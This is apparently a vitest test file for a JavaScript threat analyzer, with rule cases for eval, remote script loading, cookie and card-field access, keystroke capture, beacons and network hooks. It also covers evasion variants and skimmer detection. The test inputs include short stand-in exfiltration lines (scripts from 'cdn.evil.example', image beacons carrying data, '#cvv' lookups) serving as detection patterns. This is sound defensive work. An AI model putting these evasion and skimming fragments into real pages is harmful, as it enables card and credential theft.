import { describe, expect, it } from 'vitest';
import { analyzeJavaScript } from '../../src/analysis/ast-analyzer.js';
import { RULES } from '../../src/analysis/indicator-rules.js';
import { BENIGN_ANALYTICS, MINIFIED_LIBRARY, SKIMMER, obfuscatedLoader } from '../fixtures/scripts.js';

const ids = (src: string): string[] => Object.keys(analyzeJavaScript(src).counts).sort();
const has = (src: string, id: string): boolean => (analyzeJavaScript(src).counts[id] ?? 0) > 0;

describe('rule catalogue', () => {
  it('documents every rule completely', () => {
    for (const r of RULES) {
      expect(r.id).toMatch(/^TS-[A-Z0-9-]+$/);
      for (const field of [r.name, r.description, r.explanation, r.investigation, r.falsePositives]) expect(field.length).toBeGreaterThan(10);
      expect(['info', 'low', 'medium', 'high', 'critical']).toContain(r.severity);
      expect(['low', 'medium', 'high']).toContain(r.confidence);
    }
    expect(new Set(RULES.map((r) => r.id)).size).toBe(RULES.length);
  });
});

describe('individual rules', () => {
  it.each([
    ['TS-EVAL', 'eval(code)', 'var x = { eval: 1 }; x.eval;'],
    ['TS-EVAL', 'window.eval("1")', 'function f(eval2){ return eval2("x") }'],
    ['TS-NEW-FUNCTION', 'var f = new Function("a", "return a")', 'function Fn(){}; new Fn()'],
    ['TS-NEW-FUNCTION', '[].constructor.constructor("return this")()', 'obj.constructor()'],
    ['TS-STRING-TIMER', 'setTimeout("doIt()", 10)', 'setTimeout(function(){ doIt() }, 10)'],
    ['TS-SCRIPT-INJECTION', 'var s = document.createElement("script"); document.head.appendChild(s)', 'document.createElement("div")'],
    ['TS-SCRIPT-INJECTION', 'document.write("<scr" + "ipt src=x></script>")', 'document.write("<p>hello</p>")'],
    ['TS-REMOTE-SCRIPT-LOAD', 'var s = document.createElement("script"); s.src = "https://cdn.evil.example/x.js"', 'var s = document.createElement("script"); s.src = "/local.js"'],
    ['TS-REMOTE-SCRIPT-LOAD', '(function(d){ var s = d.createElement("script"); s.src = "//cdn.evil.example/x.js" })(document)', 'var i = new Image(); i.src = "https://px.example/p"'],
    ['TS-COOKIE-ACCESS', '(function(w, d){ return d.cookie })(window, document)', '(function(w, d){ return d.cookie })(window, other)'],
    ['TS-BEACON', 'var n = navigator; n.sendBeacon(u, d)', 'var n = other; n.sendBeacon(u, d)'],
    ['TS-REMOTE-SCRIPT-LOAD', 'importScripts("https://cdn.example/w.js")', 'importScripts("./w.js")'],
    ['TS-REMOTE-SCRIPT-LOAD', 'import("https://esm.example/mod.js")', 'import("./mod.js")'],
    ['TS-COOKIE-ACCESS', 'var c = document.cookie', 'var c = doc.cookieJar'],
    ['TS-WEB-STORAGE', 'localStorage.getItem("k")', 'var localStorageKey = 1'],
    ['TS-WEB-STORAGE', 'window.sessionStorage.setItem("k", 1)', 'storage.getItem("k")'],
    ['TS-SENSITIVE-FIELD-ACCESS', 'document.querySelector("input[name=cardnumber]")', 'document.querySelector("#main-nav")'],
    ['TS-SENSITIVE-FIELD-ACCESS', 'document.getElementById("password")', 'document.getElementById("passage")'],
    ['TS-FORM-FIELD-ACCESS', 'document.querySelectorAll("input")', 'document.querySelectorAll(".card-grid")'],
    ['TS-FORM-FIELD-ACCESS', 'form.addEventListener("submit", f)', 'btn.addEventListener("click", f)'],
    ['TS-KEYSTROKE-CAPTURE', 'document.addEventListener("keydown", f)', 'document.addEventListener("scroll", f)'],
    ['TS-KEYSTROKE-CAPTURE', 'el.onkeyup = f', 'el.onclick = f'],
    ['TS-CLIPBOARD', 'navigator.clipboard.readText()', 'navigator.userAgent'],
    ['TS-CLIPBOARD', 'document.addEventListener("paste", f)', 'document.addEventListener("load", f)'],
    ['TS-BEACON', 'navigator.sendBeacon(u, d)', 'sendBeaconLater(u)'],
    ['TS-WEBSOCKET', 'new WebSocket("wss://live.example/s")', 'new MySocket("x")'],
    ['TS-REMOTE-ENDPOINT', 'fetch("https://api.example/x")', 'fetch("/api/x")'],
    ['TS-REMOTE-ENDPOINT', 'new Image().src = "https://px.example/p?d=" + d', 'img.src = "/logo.png"'],
    ['TS-REMOTE-ENDPOINT', 'xhr.open("POST", "https://c.example/collect")', 'dialog.open("modal")'],
    ['TS-NETWORK-API-HOOK', 'XMLHttpRequest.prototype.send = function(){}', 'MyThing.prototype.send = function(){}'],
    ['TS-NETWORK-API-HOOK', 'window.fetch = wrapped', 'var fetchLater = wrapped'],
    // Evasion variants: optional chaining, tagged templates, constructor gadgets, folded names, aliases, hooks.
    ['TS-EVAL', 'eval?.(p)', 'evaluate?.(p)'],
    ['TS-EVAL', 'var e = eval; e(p)', 'var e = other; e(p)'],
    ['TS-EVAL', "window['ev' + 'al'](p)", "window['ev' + 'ent'](p)"],
    ['TS-EVAL', '(0, eval)(p)', '(0, other)(p)'],
    ['TS-NEW-FUNCTION', 'Function?.(p)()', 'Fn?.(p)()'],
    ['TS-NEW-FUNCTION', 'Function`alert(1)`', 'tag`alert(1)`'],
    ['TS-NEW-FUNCTION', '(function(){}).constructor(p)()', 'obj.constructor(p)'],
    ['TS-NEW-FUNCTION', '[]["filter"]["constructor"](p)()', '[]["filter"]["call"](p)'],
    ['TS-STRING-TIMER', 'setTimeout`x`', 'tag`x`'],
    ['TS-BEACON', 'navigator.sendBeacon?.(u, d)', 'other.sendBeacon?.(u, d)'],
    ['TS-REMOTE-ENDPOINT', 'fetch?.("https://x.example/c")', 'fetch?.("/c")'],
    ['TS-SENSITIVE-FIELD-ACCESS', "document.querySelector?.('#cvv')", "document.querySelector?.('#nav')"],
    ['TS-COOKIE-ACCESS', "document['coo' + 'kie']", "document['coo' + 'lie']"],
    ['TS-COOKIE-ACCESS', "const k = 'coo' + 'kie'; document[k]", "const k = 'coo' + 'lie'; document[k]"],
    ['TS-NETWORK-API-HOOK', "Object.defineProperty(window, 'fetch', { value: f })", "Object.defineProperty(window, 'foo', { value: f })"],
    ['TS-NETWORK-API-HOOK', "var P = XMLHttpRequest.prototype; P['op' + 'en'] = f", "var P = Other.prototype; P['op' + 'en'] = f"],
  ])('%s matches "%s" but not "%s"', (rule, positive, negative) => {
    expect(has(positive, rule)).toBe(true);
    expect(has(negative, rule)).toBe(false);
  });

  it('does not treat a locally defined eval as global eval', () => {
    expect(has('function f(){ var eval = function(x){return x}; eval("1") }', 'TS-EVAL')).toBe(false);
  });

  it('ignores patterns inside comments and unrelated strings', () => {
    expect(ids('// eval(x); document.cookie\nvar s = "eval(code) and document.cookie";')).toEqual([]);
  });

  it('records referenced hosts', () => {
    const r = analyzeJavaScript('fetch("https://api.vendor.example/v1"); var u = "https://cdn.other.example/a.js";');
    expect(r.hosts).toEqual(['api.vendor.example', 'cdn.other.example']);
  });

  it('keeps short snippets with line numbers, never the whole script', () => {
    const r = analyzeJavaScript(`var a = 1;\n${'x'.repeat(5000)};eval(payload);${'y'.repeat(5000)}`);
    const m = r.matches.find((x) => x.ruleId === 'TS-EVAL');
    expect(m?.line).toBe(2);
    expect(m?.snippet.length).toBeLessThan(200);
    expect(m?.snippet).toContain('eval(payload)');
  });
});

describe('aggregate rules and false positives', () => {
  it('flags the skimmer pattern as a sensitive-data + transmission combination', () => {
    const found = ids(SKIMMER);
    expect(found).toEqual(expect.arrayContaining(['TS-SENSITIVE-FIELD-ACCESS', 'TS-KEYSTROKE-CAPTURE', 'TS-REMOTE-ENDPOINT', 'TS-EXFIL-COMBINATION']));
  });

  it('does not flag typical analytics code as a skimming combination or obfuscation', () => {
    const found = ids(BENIGN_ANALYTICS);
    expect(found).toEqual(expect.arrayContaining(['TS-COOKIE-ACCESS', 'TS-WEB-STORAGE', 'TS-BEACON']));
    expect(found).not.toContain('TS-EXFIL-COMBINATION');
    expect(found).not.toContain('TS-OBFUSCATION');
    expect(found).not.toContain('TS-SENSITIVE-FIELD-ACCESS');
  });

  it('does not treat ordinary minified code as obfuscated', () => {
    expect(ids(MINIFIED_LIBRARY)).not.toContain('TS-OBFUSCATION');
  });

  it('detects obfuscation from several independent signals', () => {
    const r = analyzeJavaScript(obfuscatedLoader());
    expect(r.counts['TS-OBFUSCATION']).toBe(1);
    expect(r.counts['TS-EVAL']).toBe(1);
    expect(r.matches.find((m) => m.ruleId === 'TS-OBFUSCATION')?.detail).toMatch(/hex-named identifiers/);
  });
});

describe('analyzer robustness', () => {
  it('reports unparseable code as not analysed instead of throwing', () => {
    const r = analyzeJavaScript('function ( {');
    expect(r.analyzed).toBe(false);
    expect(r.error).toMatch(/parse error/);

  });

  it('refuses oversize input', () => {
    const r = analyzeJavaScript('x'.repeat(2000), { maxBytes: 1024 });
    expect(r.analyzed).toBe(false);
    expect(r.error).toMatch(/larger than/);
  });

  it('survives deeply nested input', () => {
    const deep = `${'['.repeat(20000)}${']'.repeat(20000)}`;
    const r = analyzeJavaScript(deep);
    expect(typeof r.analyzed).toBe('boolean');
  });

  it('runs only the selected rules', () => {
    const only = RULES.filter((r) => r.id === 'TS-EVAL');
    expect(Object.keys(analyzeJavaScript('eval(x); document.cookie', { rules: only }).counts)).toEqual(['TS-EVAL']);
  });
});
